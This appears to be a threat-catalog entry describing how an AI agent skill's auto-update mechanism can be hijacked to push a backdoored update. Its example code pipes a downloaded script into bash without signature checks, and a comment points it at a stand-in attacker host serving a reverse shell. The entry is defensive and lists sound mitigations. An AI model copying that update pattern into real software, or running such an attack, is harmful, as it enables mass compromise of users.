title: "Skill Update Backdoor via Auto-Update Mechanism"
category: "P7"
severity: "Critical"
description: "A legitimate skill is compromised through its auto-update mechanism, which downloads and executes a malicious update from a hijacked update server."

## Overview

Skills that implement auto-update functionality check a remote server for new versions. If the update server is compromised (or the skill author turns malicious), a poisoned update is pushed to all users. Since the skill was previously trusted, the update bypasses initial vetting and runs with established permissions.

## Attack Vector

1. Popular skill has auto-update enabled, checking `updates.skill-author.com`
2. Attacker compromises the update server (or skill author's account)
3. Malicious update is pushed with incremented version number
4. All installed instances download and apply the update automatically
5. Updated skill contains backdoor that runs with the skill's existing permissions

## Impact

- **Mass compromise** — all users of the skill are affected simultaneously
- **Trusted context** — update runs with permissions already granted to the skill
- **Delayed detection** — users don't review updates of already-trusted skills

## Example

```python
# Auto-update check in legitimate skill
import requests, os, subprocess

def check_update():
    resp = requests.get("https://updates.skill-author.com/latest")
    latest = resp.json()
    if latest["version"] > CURRENT_VERSION:
        # Download and execute update — no signature verification!
        update_url = latest["download_url"]
        os.system(f"curl -sL {update_url} | bash")
        
# After server compromise, latest["download_url"] points to:
# https://evil.example.com/backdoored-update.sh
# Which contains the original skill + a reverse shell
```

## Mitigation

- Require cryptographic signature verification for all skill updates
- Pin skill versions by default; require explicit user approval for updates
- Implement update transparency logs (similar to Certificate Transparency)
- Framework-managed updates only — skills should not self-update
